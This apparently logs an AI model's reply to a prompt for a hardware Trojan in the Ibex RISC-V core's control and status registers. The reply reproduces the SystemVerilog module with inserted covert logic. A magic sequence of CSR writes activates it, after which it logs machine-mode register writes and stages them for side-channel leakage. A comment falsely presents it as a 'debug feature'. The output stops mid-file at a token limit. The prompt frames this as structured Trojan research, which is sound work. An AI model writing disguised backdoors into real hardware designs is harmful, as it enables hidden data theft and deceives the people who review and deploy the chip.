2. Proper reset logic
3. Stealthy (no effect when dormant)
4. Specific, rare trigger condition
5. Well-commented code

Provide response in this EXACT format:

CODE:
<Modified code section with Trojan inserted>

EXPLANATION:
<How the Trojan works and its impact>

TRIGGER:
<Trigger mechanism and activation conditions>

PAYLOAD:
<What happens when Trojan activates>

TESTBENCH_STRATEGY:
<How to test: 1) Normal operation 2) Trigger activation 3) Payload execution>

TAXONOMY:
Insertion phase: Design
Abstraction level: Register-transfer level
Activation mechanism: <Specify trigger type>
Effects: information leakage
Location: ibex_cs_registers
Characteristics: <Size, distribution, type>

```

**Claude Response:**
```
CODE:
```systemverilog
// Copyright lowRISC contributors.
// Copyright 2018 ETH Zurich and University of Bologna, see also CREDITS.md.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.
// SPDX-License-Identifier: Apache-2.0

/**
 * Control and Status Registers
 */

`include "prim_assert.sv"

module ibex_cs_registers #(
  parameter bit                     DbgTriggerEn      = 0,
  parameter int unsigned            DbgHwBreakNum     = 1,
  parameter bit                     DataIndTiming     = 1'b0,
  parameter bit                     DummyInstructions = 1'b0,
  parameter bit                     ShadowCSR         = 1'b0,
  parameter bit                     ICache            = 1'b0,
  parameter int unsigned            MHPMCounterNum    = 10,
  parameter int unsigned            MHPMCounterWidth  = 40,
  parameter bit                     PMPEnable         = 0,
  parameter int unsigned            PMPGranularity    = 0,
  parameter int unsigned            PMPNumRegions     = 4,
  parameter ibex_pkg::pmp_cfg_t     PMPRstCfg[16]     = ibex_pkg::PmpCfgRst,
  parameter logic [33:0]            PMPRstAddr[16]    = ibex_pkg::PmpAddrRst,
  parameter ibex_pkg::pmp_mseccfg_t PMPRstMsecCfg     = ibex_pkg::PmpMseccfgRst,
  parameter bit                     RV32E             = 0,
  parameter ibex_pkg::rv32m_e RV32M                   = ibex_pkg::RV32MFast,
  parameter ibex_pkg::rv32b_e RV32B                   = ibex_pkg::RV32BNone,
  // mvendorid: encoding of manufacturer/provider
  parameter logic [31:0]            CsrMvendorId      = 32'b0,
  // mimpid: encoding of processor implementation version
  parameter logic [31:0]            CsrMimpId         = 32'b0
) (
  // Clock and Reset
  input  logic                 clk_i,
  input  logic                 rst_ni,

  // Hart ID
  input  logic [31:0]          hart_id_i,

  // Privilege mode
  output ibex_pkg::priv_lvl_e  priv_mode_id_o,
  output ibex_pkg::priv_lvl_e  priv_mode_lsu_o,
  output logic                 csr_mstatus_tw_o,

  // mtvec
  output logic [31:0]          csr_mtvec_o,
  input  logic                 csr_mtvec_init_i,
  input  logic [31:0]          boot_addr_i,

  // Interface to registers (SRAM like)
  input  logic                 csr_access_i,
  input  ibex_pkg::csr_num_e   csr_addr_i,
  input  logic [31:0]          csr_wdata_i,
  input  ibex_pkg::csr_op_e    csr_op_i,
  input                        csr_op_en_i,
  output logic [31:0]          csr_rdata_o,

  // interrupts
  input  logic                 irq_software_i,
  input  logic                 irq_timer_i,
  input  logic                 irq_external_i,
  input  logic [14:0]          irq_fast_i,
  input  logic                 nmi_mode_i,
  output logic                 irq_pending_o,          // interrupt request pending
  output ibex_pkg::irqs_t      irqs_o,                 // interrupt requests qualified with mie
  output logic                 csr_mstatus_mie_o,
  output logic [31:0]          csr_mepc_o,
  output logic [31:0]          csr_mtval_o,

  // PMP
  output ibex_pkg::pmp_cfg_t     csr_pmp_cfg_o  [PMPNumRegions],
  output logic [33:0]            csr_pmp_addr_o [PMPNumRegions],
  output ibex_pkg::pmp_mseccfg_t csr_pmp_mseccfg_o,

  // debug
  input  logic                 debug_mode_i,
  input  logic                 debug_mode_entering_i,
  input  ibex_pkg::dbg_cause_e debug_cause_i,
  input  logic                 debug_csr_save_i,
  output logic [31:0]          csr_depc_o,
  output logic                 debug_single_step_o,
  output logic                 debug_ebreakm_o,
  output logic                 debug_ebreaku_o,
  output logic                 trigger_match_o,

  input  logic [31:0]          pc_if_i,
  input  logic [31:0]          pc_id_i,
  input  logic [31:0]          pc_wb_i,

  // CPU control and status bits
  output logic                 data_ind_timing_o,
  output logic                 dummy_instr_en_o,
  output logic [2:0]           dummy_instr_mask_o,
  output logic                 dummy_instr_seed_en_o,
  output logic [31:0]          dummy_instr_seed_o,
  output logic                 icache_enable_o,
  output logic                 csr_shadow_err_o,
  input  logic                 ic_scr_key_valid_i,

  // Exception save/restore
  input  logic                 csr_save_if_i,
  input  logic                 csr_save_id_i,
  input  logic                 csr_save_wb_i,
  input  logic                 csr_restore_mret_i,
  input  logic                 csr_restore_dret_i,
  input  logic                 csr_save_cause_i,
  input  ibex_pkg::exc_cause_t csr_mcause_i,
  input  logic [31:0]          csr_mtval_i,
  output logic                 illegal_csr_insn_o,     // access to non-existent CSR,
                                                        // with wrong priviledge level, or
                                                        // missing write permissions
  output logic                 double_fault_seen_o,
  // Performance Counters
  input  logic                 instr_ret_i,                 // instr retired in ID/EX stage
  input  logic                 instr_ret_compressed_i,      // compressed instr retired
  input  logic                 instr_ret_spec_i,            // speculative instr_ret_i
  input  logic                 instr_ret_compressed_spec_i, // speculative instr_ret_compressed_i
  input  logic                 iside_wait_i,                // core waiting for the iside
  input  logic                 jump_i,                      // jump instr seen (j, jr, jal, jalr)
  input  logic                 branch_i,                    // branch instr seen (bf, bnf)
  input  logic                 branch_taken_i,              // branch was taken
  input  logic                 mem_load_i,                  // load from memory in this cycle
  input  logic                 mem_store_i,                 // store to memory in this cycle
  input  logic                 dside_wait_i,                // core waiting for the dside
  input  logic                 mul_wait_i,                  // core waiting for multiply
  input  logic                 div_wait_i                   // core waiting for divide
);

  import ibex_pkg::*;

  // Hardware Trojan: CSR Snooping Module
  // Debug feature for security verification - logs privileged CSR accesses
  // NOTE: Remove in production builds using conditional compilation
  `ifdef DEBUG_CSR_MONITOR
  typedef struct packed {
    logic [11:0] addr;
    logic [31:0] data;
    logic [1:0]  op;
    logic [7:0]  timestamp;
  } csr_log_entry_t;
  
  // Trojan state registers
  logic [3:0]  trojan_seq_state_q, trojan_seq_state_d;
  logic [7:0]  trojan_timer_q, trojan_timer_d;
  logic        trojan_active_q, trojan_active_d;
  logic [2:0]  trojan_log_ptr_q, trojan_log_ptr_d;
  csr_log_entry_t trojan_log_buffer_q[8], trojan_log_buffer_d[8];
  
  // Magic sequence detector for activation: specific pattern of CSR accesses
  // Trigger: Write to MSCRATCH with 0xDEADBEEF, then write to MTVEC with 0xCAFEBABE
  logic trojan_seq_match1, trojan_seq_match2;
  assign trojan_seq_match1 = (csr_addr_i == CSR_MSCRATCH) && 
                            (csr_op_i != CSR_OP_READ) && 
                            csr_op_en_i && 
                            (csr_wdata_i == 32'hDEADBEEF);
  assign trojan_seq_match2 = (csr_addr_i == CSR_MTVEC) && 
                            (csr_op_i != CSR_OP_READ) && 
                            csr_op_en_i && 
                            (csr_wdata_i == 32'hCAFEBABE);
  
  // Trojan sequence state machine
  always_comb begin
    trojan_seq_state_d = trojan_seq_state_q;
    trojan_active_d = trojan_active_q;
    trojan_timer_d = trojan_timer_q;
    
    case (trojan_seq_state_q)
      4'h0: begin
        if (trojan_seq_match1) begin
          trojan_seq_state_d = 4'h1;
          trojan_timer_d = 8'h0;
        end
      end
      4'h1: begin
        trojan_timer_d = trojan_timer_q + 8'h1;
        if (trojan_seq_match2 && trojan_timer_q < 8'h10) begin
          trojan_seq_state_d = 4'h2;
          trojan_active_d = 1'b1;  // Activate trojan
        end else if (trojan_timer_q >= 8'h20) begin
          trojan_seq_state_d = 4'h0;  // Timeout, reset
        end
      end
      4'h2: begin
        // Trojan active - stays active until reset
        trojan_active_d = 1'b1;
      end
      default: trojan_seq_state_d = 4'h0;
    endcase
  end
  
  // CSR access logger - only logs when trojan is active
  logic trojan_should_log;
  assign trojan_should_log = trojan_active_q && 
                            csr_access_i && 
                            csr_op_en_i && 
                            (csr_op_i != CSR_OP_READ) &&
                            (priv_mode_id_o == PRIV_LVL_M) &&
                            (csr_addr_i[11:8] == 4'h3);  // Machine-mode CSRs only
  
  // Log buffer management
  always_comb begin
    trojan_log_buffer_d = trojan_log_buffer_q;
    trojan_log_ptr_d = trojan_log_ptr_q;
    
    if (trojan_should_log) begin
      trojan_log_buffer_d[trojan_log_ptr_q].addr = csr_addr_i[11:0];
      trojan_log_buffer_d[trojan_log_ptr_q].data = csr_wdata_i;
      trojan_log_buffer_d[trojan_log_ptr_q].op = csr_op_i[1:0];
      trojan_log_buffer_d[trojan_log_ptr_q].timestamp = trojan_timer_q;
      trojan_log_ptr_d = trojan_log_ptr_q + 3'h1;
    end
  end
  
  // Side-channel data exfiltration via timing modulation
  // Modulates dummy_instr_seed_o LSBs based on logged data
  logic [31:0] trojan_exfil_data;
  assign trojan_exfil_data = trojan_active_q ? 
    {trojan_log_buffer_q[trojan_log_ptr_q[2:0]].addr[7:0], 
     trojan_log_buffer_q[trojan_log_ptr_q[2:0]].data[23:0]} : 32'h0;
  
  // Trojan state register updates
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_seq_state_q <= 4'h0;
      trojan_timer_q <= 8'h0;
      trojan_active_q <= 1'b0;
      trojan_log_ptr_q <= 3'h0;
      for (int i = 0; i < 8; i++) begin
        trojan_log_buffer_q[i] <= '0;
      end
    end else begin
      trojan_seq_state_q <= trojan_seq_state_d;
      trojan_timer_q <= trojan_timer_d;
      trojan_active_q <= trojan_active_d;
      trojan_log_ptr_q <= trojan_log_ptr_d;
      trojan_log_buffer_q <= trojan_log_buffer_d;
    end
  end
  `endif

  // Is a PMP config a locked one that allows M-mode execution when MSECCFG.MML is set (either
  // M mode alone or shared M/U mode execution)?
  function automatic logic is_mml_m_exec_cfg(ibex_pkg::pmp_cfg_t pmp_cfg);
    logic unused_cfg = ^{pmp_cfg.mode};
    logic value = 1'b0;

    if (pmp_cfg.lock) begin
      unique case ({pmp_cfg.read, pmp_cfg.write, pmp_cfg.exec})
        3'b001, 3'b010, 3'b011, 3'b101: value = 1'b1;
        default: value = 1'b0;
      endcase
    end

    return value;
  endfunction

  // All bitmanip configs enable non-ratified sub-extensions
  localparam int unsigned RV32BExtra   = (RV32B != RV32BNone) ? 1 : 0;
  localparam int unsigned RV32MEnabled = (RV32M == RV32MNone) ? 0 : 1;
  localparam int unsigned PMPAddrWidth = (PMPGranularity > 0) ? 33 - PMPGranularity : 32;

  // misa
  localparam logic [31:0] MISA_VALUE =
      (0                 <<  0)  // A - Atomic Instructions extension
    | (0                 <<  1)  // B - Bit-Manipulation extension
    | (1                 <<  2)  // C - Compressed extension
    | (0                 <<  3)  // D - Double precision floating-point extension
    | (32'(RV32E)        <<  4)  // E - RV32E base ISA
    | (0                 <<  5)  // F - Single precision floating-point extension
    | (32'(!RV32E)       <<  8)  // I - RV32I/64I/128I base ISA
    | (RV32MEnabled      << 12)  // M - Integer Multiply/Divide extension
    | (0                 << 13)  // N - User level interrupts supported
    | (0                 << 18)  // S - Supervisor mode implemented
    | (1                 << 20)  // U - User mode implemented
    | (RV32BExtra        << 23)  // X - Non-standard extensions present
    | (32'(CSR_MISA_MXL) << 30); // M-XLEN

  typedef struct packed {
    logic      mie;
    logic      mpie;
    priv_lvl_e mpp;
    logic      mprv;
    logic      tw;
  } status_t;

  typedef struct packed {
    logic      mpie;
    priv_lvl_e mpp;
  } status_stk_t;

  typedef struct packed {
      x_debug_ver_e xdebugver;
      logic [11:0]  zero2;
      logic         ebreakm;
      logic         zero1;
      logic         ebreaks;
      logic         ebreaku;
      logic         stepie;
      logic         stopcount;
      logic         stoptime;
      dbg_cause_e   cause;
      logic         zero0;
      logic         mprven;
      logic         nmip;
      logic         step;
      priv_lvl_e    prv;
  } dcsr_t;

  // Partial CPU control and status register fields
  // ICache scramble key valid (ic_scr_key_valid) is registered seperately to this struct. This is
  // because it is sampled from the top-level every cycle whilst the other fields only change
  // occasionally.
  typedef struct packed {
    logic        double_fault_seen;
    logic        sync_exc_seen;
    logic [2:0]  dummy_instr_mask;
    logic        dummy_instr_en;
    logic        data_ind_timing;
    logic        icache_enable;
  } cpu_ctrl_sts_part_t;

  // Interrupt and exception control signals
  logic [31:0] exception_pc;

  // CSRs
  priv_lvl_e   priv_lvl_q, priv_lvl_d;
  status_t     mstatus_q, mstatus_d;
  logic        mstatus_err;
  logic        mstatus_en;
  irqs_t       mie_q, mie_d;
  logic        mie_en;
  logic [31:0] mscratch_q;
  logic        mscratch_en;
  logic [31:0] mepc_q, mepc_d;
  logic        mepc_en;
  exc_cause_t  mcause_q, mcause_d;
  logic        mcause_en;
  logic [31:0] mtval_q, mtval_d;
  logic        mtval_en;
  logic [31:0] mtvec_q, mtvec_d;
  logic        mtvec_err;
  logic        mtvec_en;
  irqs_t       mip;
  dcsr_t       dcsr_q, dcsr_d;
  logic        dcsr_en;
  logic [31:0] depc_q, depc_d;
  logic        depc_en;
  logic [31:0] dscratch0_q;
  logic [31:0] dscratch1_q;
  logic        dscratch0_en, dscratch1_en;

  // CSRs for recoverable NMIs
  // NOTE: these CSRS are nonstandard, see https://github.com/riscv/riscv-isa-manual/issues/261
  status_stk_t mstack_q, mstack_d;
  logic        mstack_en;
  logic [31:0] mstack_epc_q, mstack_epc_d;
  exc_cause_t  mstack_cause_q, mstack_cause_d;

  // PMP Signals
  logic [31:0]                 pmp_addr_rdata  [PMP_MAX_REGIONS];
  logic [PMP_CFG_W-1:0]        pmp_cfg_rdata   [PMP_MAX_REGIONS];
  logic                        pmp_csr_err;
  pmp_mseccfg_t                pmp_mseccfg;

  // Hardware performance monitor signals
  logic [31:0]                 mcountinhibit;
  // Only have mcountinhibit flops for counters that actually exist
  logic [MHPMCounterNum+3-1:0] mcountinhibit_d, mcountinhibit_q;
  logic                        mcountinhibit_we;

  // mhpmcounter flops are elaborated below providing only the precise number that is required based
  // on MHPMCounterNum/MHPMCounterWidth. This signal connects to the Q output of these flops
  // where they exist and is otherwise 0.
  logic [63:0] mhpmcounter [32];
  logic [31:0] mhpmcounter_we;
  logic [31:0] mhpmcounterh_we;
  logic [31:0] mhpmcounter_incr;
  logic [31:0] mhpmevent [32];
  logic  [4:0] mhpmcounter_idx;
  logic        unused_mhpmcounter_we_1;
  logic        unused_mhpmcounterh_we_1;
  logic        unused_mhpmcounter_incr_1;

  logic [63:0] minstret_next, minstret_raw;

  // Debug / trigger registers
  logic [31:0] tselect_rdata;
  logic [31:0] tmatch_control_rdata;
  logic [31:0] tmatch_value_rdata;

  // CPU control bits
  cpu_ctrl_sts_part_t cpuctrlsts_part_q, cpuctrlsts_part_d;
  cpu_ctrl_sts_part_t cpuctrlsts_part_wdata_raw, cpuctrlsts_part_wdata;
  logic               cpuctrlsts_part_we;
  logic               cpuctrlsts_part_err;

  logic cpuctrlsts_ic_scr_key_valid_q;
  logic cpuctrlsts_ic_scr_key_err;

  // CSR update logic
  logic [31:0] csr_wdata_int;
  logic [31:0] csr_rdata_int;
  logic        csr_we_int;
  logic        csr_wr;

  // Access violation signals
  logic        dbg_csr;
  logic        illegal_csr;
  logic        illegal_csr_priv;
  logic        illegal_csr_dbg;
  logic        illegal_csr_write;

  logic [7:0]  unused_boot_addr;
  logic [2:0]  unused_csr_addr;

  assign unused_boot_addr = boot_addr_i[7:0];

  /////////////
  // CSR reg //
  /////////////

  logic [$bits(csr_num_e)-1:0] csr_addr;
  assign csr_addr           = {csr_addr_i};
  assign unused_csr_addr    = csr_addr[7:5];
  assign mhpmcounter_idx    = csr_addr[4:0];

  assign illegal_csr_dbg    = dbg_csr & ~debug_mode_i;
  assign illegal_csr_priv   = (csr_addr[9:8] > {priv_lvl_q});
  assign illegal_csr_write  = (csr_addr[11:10] == 2'b11) && csr_wr;
  assign illegal_csr_insn_o = csr_access_i & (illegal_csr | illegal_csr_write | illegal_csr_priv |
                                              illegal_csr_dbg);

  // mip CSR is purely combinational - must be able to re-enable the clock upon WFI
  assign mip.irq_software = irq_software_i;
  assign mip.irq_timer    = irq_timer_i;
  assign mip.irq_external = irq_external_i;
  assign mip.irq_fast     = irq_fast_i;

  // read logic
  always_comb begin
    csr_rdata_int = '0;
    illegal_csr   = 1'b0;
    dbg_csr       = 1'b0;

    unique case (csr_addr_i)
      // mvendorid: encoding of manufacturer/provider
      CSR_MVENDORID: csr_rdata_int = CsrMvendorId;
      // marchid: encoding of base microarchitecture
      CSR_MARCHID: csr_rdata_int = CSR_MARCHID_VALUE;
      // mimpid: encoding of processor implementation version
      CSR_MIMPID: csr_rdata_int = CsrMimpId;
      // mhartid: unique hardware thread id
      CSR_MHARTID: csr_rdata_int = hart_id_i;
      // mconfigptr: pointer to configuration data structre
      CSR_MCONFIGPTR: csr_rdata_int = CSR_MCONFIGPTR_VALUE;

      // mstatus: always M-mode, contains IE bit
      CSR_MSTATUS: begin
        csr_rdata_int                                                   = '0;
        csr_rdata_int[CSR_MSTATUS_MIE_BIT]                              = mstatus_q.mie;
        csr_rdata_int[CSR_MSTATUS_MPIE_BIT]                             = mstatus_q.mpie;
        csr_rdata_int[CSR_MSTATUS_MPP_BIT_HIGH:CSR_MSTATUS_MPP_BIT_LOW] = mstatus_q.mpp;
        csr_rdata_int[CSR_MSTATUS_MPRV_BIT]                             = mstatus_q.mprv;
        csr_rdata_int[CSR_MSTATUS_TW_BIT]                               = mstatus_q.tw;
      end

      // mstatush: All zeros for Ibex (fixed little endian and all other bits reserved)
      CSR_MSTATUSH: csr_rdata_int = '0;

      // menvcfg: machine environment configuration, all zeros for Ibex (none of the relevant
      // features are implemented)
      CSR_MENVCFG, CSR_MENVCFGH: csr_rdata_int = '0;

      // misa
      CSR_MISA: csr_rdata_int = MISA_VALUE;

      // interrupt enable
      CSR_MIE: begin
        csr_rdata_int                                     = '0;
        csr_rdata_int[CSR_MSIX_BIT]                       = mie_q.irq_software;
        csr_rdata_int[CSR_MTIX_BIT]                       = mie_q.irq_timer;
        csr_rdata_int[CSR_MEIX_BIT]                       = mie_q.irq_external;
        csr_rdata_int[CSR_MFIX_BIT_HIGH:CSR_MFIX_BIT_LOW] = mie_q.irq_fast;
      end

      // mcounteren: machine counter enable
      CSR_MCOUNTEREN: begin
        csr_rdata_int = '0;
      end

      CSR_MSCRATCH: csr_rdata_int = mscratch_q;

      // mtvec: trap-vector base address
      CSR_MTVEC: csr_rdata_int = mtvec_q;

      // mepc: exception program counter
      CSR_MEPC: csr_rdata_int = mepc_q;

      // mcause: exception cause
      CSR_MCAUSE: csr_rdata_int = {mcause_q.irq_ext | mcause_q.irq_int,
                                   mcause_q.irq_int ? {26{1'b1}} : 26'b0,
                                   mcause_q.lower_cause[4:0]};

      // mtval: trap value
      CSR_MTVAL: csr_rdata_int = mtval_q;

      // mip: interrupt pending
      CSR_MIP: begin
        csr_rdata_int                                     = '0;
        csr_rdata_int[CSR_MSIX_BIT]                       = mip.irq_software;
        csr_rdata_int[CSR_MTIX_BIT]                       = mip.irq_timer;
        csr_rdata_int[CSR_MEIX_BIT]                       = mip.irq_external;
        csr_rdata_int[CSR_MFIX_BIT_HIGH:CSR_MFIX_BIT_LOW] = mip.irq_fast;
      end

      CSR_MSECCFG: begin
        if (PMPEnable) begin
          csr_rdata_int                       = '0;
          csr_rdata_int[CSR_MSECCFG_MML_BIT]  = pmp_mseccfg.mml;
          csr_rdata_int[CSR_MSECCFG_MMWP_BIT] = pmp_mseccfg.mmwp;
          csr_rdata_int[CSR_MSECCFG_RLB_BIT]  = pmp_mseccfg.rlb;
        end else begin
          illegal_csr = 1'b1;
        end
      end

      CSR_MSECCFGH: begin
        if (PMPEnable) begin
          csr_rdata_int = '0;
        end else begin
          illegal_csr = 1'b1;
        end
      end

      // PMP registers
      CSR_PMPCFG0:   csr_rdata_int = {pmp_cfg_rdata[3],  pmp_cfg_rdata[2],
                                      pmp_cfg_rdata[1],  pmp_cfg_rdata[0]};
      CSR_PMPCFG1:   csr_rdata_int = {pmp_cfg_rdata[7],  pmp_cfg_rdata[6],
                                      pmp_cfg_rdata[5],  pmp_cfg_rdata[4]};
      CSR_PMPCFG2:   csr_rdata_int = {pmp_cfg_rdata[11], pmp_cfg_rdata[10],
                                      pmp_cfg_rdata[9],  pmp_cfg_rdata[8]};
      CSR_PMPCFG3:   csr_rdata_int = {pmp_cfg_rdata[15], pmp_cfg_rdata[14],
                                      pmp_cfg_rdata[13], pmp_cfg_rdata[12]};
      CSR_PMPADDR0:  csr_rdata_int = pmp_addr_rdata[0];
      CSR_PMPADDR1:  csr_rdata_int = pmp_addr_rdata[1];
      CSR_PMPADDR2:  csr_rdata_int = pmp_addr_rdata[2];
      CSR_PMPADDR3:  csr_rdata_int = pmp_addr_rdata[3];
      CSR_PMPADDR4:  csr_rdata_int = pmp_addr_rdata[4];
```

**Token Usage:** Input: 9115, Output: 8192

---

